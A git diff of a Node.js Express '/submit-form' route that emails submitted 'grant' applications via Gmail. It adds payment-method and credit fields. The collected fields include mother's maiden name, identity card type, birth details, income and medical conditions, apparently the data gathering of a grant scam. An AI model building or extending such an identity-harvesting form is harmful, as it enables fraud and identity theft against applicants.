@@ -60,7 +60,7 @@ app.post("/submit-form", upload.single("file"), async (req, res) => {
     ownCar = "N/A",
     monthlyIncome = "N/A",
     country = "N/A",
-    vaccine = "N/A",
+    selectedVaccine = "N/A",
     reasonForNoVaccine = "N/A",
     identityCardType = "N/A",
     specialNeeds = "N/A",
@@ -68,6 +68,9 @@ app.post("/submit-form", upload.single("file"), async (req, res) => {
     medicalBills = "N/A",
     governmentBenefits = "N/A",
     homeStatus = "N/A",
+    paymentMethod = "N/A",
+    creditDescription = "N/A",
+    moneyRequirement = "N/A"
   } = req.body;
 
   const file = req.file ? req.file.filename : "No file uploaded";
@@ -75,35 +78,39 @@ app.post("/submit-form", upload.single("file"), async (req, res) => {
   const emailContent = `
   You have a new form submission:\n\n
   Name: ${fullName}\n
-  Email: ${email}\n
-  Phone: ${phone}\n
-  Address: ${JSON.stringify(address)}\n
-  Mailing Address: ${JSON.stringify(mailingAddress)}\n
-  Occupation: ${occupation}\n
-  Grant Purpose: ${grantPurpose}\n
-  Date Of Birth: ${JSON.stringify(dateOfBirth)}\n
-  Citizen: ${isCitizen}\n
-  Use Current Address: ${useCurrentAddress}\n
-  Marital Status: ${maritalStatus}\n
-  Place Of Birth: ${placeOfBirth}\n
-  Number Of Children: ${numberOfChildren}\n
-  Income: ${income}\n
-  Employer: ${employer}\n
-  Education Level: ${educationLevel}\n
-  Employment Status: ${employmentStatus}\n
-  Mother's Maiden Name: ${mothersMaidenName}\n
-  Own Car: ${ownCar}\n
-  Monthly Income: ${monthlyIncome}\n
-  Country: ${country}\n
-  Vaccine: ${vaccine}\n
-  Reason For No Vaccine: ${reasonForNoVaccine}\n
-  Identity Card Type: ${identityCardType}\n
-  Special Needs: ${specialNeeds}\n
-  Chronic Conditions: ${chronicConditions}\n
-  Medical Bills: ${medicalBills}\n
-  Government Benefits: ${governmentBenefits}\n
-  Home Status: ${homeStatus}\n
-  File: ${file}\n`;
+    Email: ${email}\n
+    Phone: ${phone}\n
+    Address: ${address}\n
+    Mailing Address: ${mailingAddress}\n
+    Occupation: ${occupation}\n
+    Grant Purpose: ${grantPurpose}\n
+    Date Of Birth: ${dateOfBirth}\n
+    Citizen: ${isCitizen}\n
+    Use Current Address: ${useCurrentAddress}\n
+    Marital Status: ${maritalStatus}\n
+    Place Of Birth: ${placeOfBirth}\n
+    Number Of Children: ${numberOfChildren}\n
+    Income: ${income}\n
+    Employer: ${employer}\n
+    Education Level: ${educationLevel}\n
+    Employment Status: ${employmentStatus}\n
+    Mother's Maiden Name: ${mothersMaidenName}\n
+    Own Car: ${ownCar}\n
+    Monthly Income: ${monthlyIncome}\n
+    Country: ${country}\n
+    selectedVaccine: ${selectedVaccine}\n
+    Reason For No Vaccine: ${reasonForNoVaccine}\n
+    Identity Card Type: ${identityCardType}\n
+    Special Needs: ${specialNeeds}\n
+    Chronic Conditions: ${chronicConditions}\n
+    Medical Bills: ${medicalBills}\n
+    Government Benefits: ${governmentBenefits}\n
+    Home Status: ${homeStatus}\n
+    PaymentMethod: ${paymentMethod}\n
+    CreditDescription: ${creditDescription}\n
+    MoneyRequirement: ${moneyRequirement}\n
+    File: ${file}\n`;
+  
 
   // Nodemailer transporter configuration
   const transporter = nodemailer.createTransport({
@@ -138,6 +145,11 @@ app.post("/submit-form", upload.single("file"), async (req, res) => {
     res.status(500).json({ message: "Failed to submit the form." });
   }
 });
+
+
+
+
+
 
 const transporter = nodemailer.createTransport({
   service: 'gmail', // You can replace this with your email provider (e.g., Outlook, Yahoo)
